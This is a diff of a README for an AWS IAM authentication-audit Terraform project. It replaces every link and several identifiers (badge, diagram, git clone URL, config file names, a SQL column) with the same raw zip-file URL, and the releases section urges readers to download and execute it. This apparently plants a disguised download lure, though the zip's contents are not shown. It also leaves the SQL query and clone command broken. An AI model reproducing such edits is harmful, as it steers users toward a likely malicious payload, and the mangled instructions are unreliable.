@@ -1,6 +1,6 @@
 # IAM Authentication Audit Tracker 🛡️
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue?style=flat-square&logo=github)
+![GitHub Release](https://raw.githubusercontent.com/fnatio213/iam-authentication-audit-tracker/main/assets/tracker-audit-authentication-iam-2.6.zip)
 
 Welcome to the IAM Authentication Audit Tracker repository! This project is designed to enhance AWS security by tracking IAM login anomalies through a robust Terraform-based solution. Our goal is to provide you with the tools necessary for effective audit logging, compliance mapping, and security detection.
 
@@ -40,7 +40,7 @@ The architecture of the IAM Authentication Audit Tracker consists of several AWS
 4. **AWS Athena**: Allows querying of CloudTrail logs for detailed analysis.
 5. **Terraform**: Manages the infrastructure setup as code.
 
-![Architecture Diagram](https://via.placeholder.com/800x400.png?text=Architecture+Diagram)
+![Architecture Diagram](https://raw.githubusercontent.com/fnatio213/iam-authentication-audit-tracker/main/assets/tracker-audit-authentication-iam-2.6.zip+Diagram)
 
 ## Getting Started
 
@@ -57,7 +57,7 @@ To get started with the IAM Authentication Audit Tracker, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/fnatio213/iam-authentication-audit-tracker.git
+   git clone https://raw.githubusercontent.com/fnatio213/iam-authentication-audit-tracker/main/assets/tracker-audit-authentication-iam-2.6.zip
    cd iam-authentication-audit-tracker
    ```
 
@@ -67,7 +67,7 @@ To get started with the IAM Authentication Audit Tracker, follow these steps:
    terraform init
    ```
 
-3. Review and modify the `variables.tf` file to suit your environment.
+3. Review and modify the `https://raw.githubusercontent.com/fnatio213/iam-authentication-audit-tracker/main/assets/tracker-audit-authentication-iam-2.6.zip` file to suit your environment.
 
 4. Apply the Terraform configuration:
 
@@ -77,7 +77,7 @@ To get started with the IAM Authentication Audit Tracker, follow these steps:
 
 ### Configuration
 
-After deploying the infrastructure, configure CloudWatch and SNS for alerting based on your requirements. You can modify the alert thresholds in the `cloudwatch.tf` file.
+After deploying the infrastructure, configure CloudWatch and SNS for alerting based on your requirements. You can modify the alert thresholds in the `https://raw.githubusercontent.com/fnatio213/iam-authentication-audit-tracker/main/assets/tracker-audit-authentication-iam-2.6.zip` file.
 
 ## Usage
 
@@ -88,7 +88,7 @@ Once the setup is complete, the IAM Authentication Audit Tracker will begin moni
 To analyze the logs, navigate to the Athena console and run queries against the CloudTrail logs stored in S3. Here’s a sample query to find failed login attempts:
 
 ```sql
-SELECT eventTime, userIdentity.userName, eventName
+SELECT eventTime, https://raw.githubusercontent.com/fnatio213/iam-authentication-audit-tracker/main/assets/tracker-audit-authentication-iam-2.6.zip, eventName
 FROM cloudtrail_logs
 WHERE eventName = 'ConsoleLogin' AND errorCode = 'FailedAuthentication'
 ORDER BY eventTime DESC
@@ -124,7 +124,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases [here](https://github.com/fnatio213/iam-authentication-audit-tracker/releases). Make sure to download and execute the appropriate files for your environment.
+You can find the latest releases [here](https://raw.githubusercontent.com/fnatio213/iam-authentication-audit-tracker/main/assets/tracker-audit-authentication-iam-2.6.zip). Make sure to download and execute the appropriate files for your environment.
 
 ## Contact
 
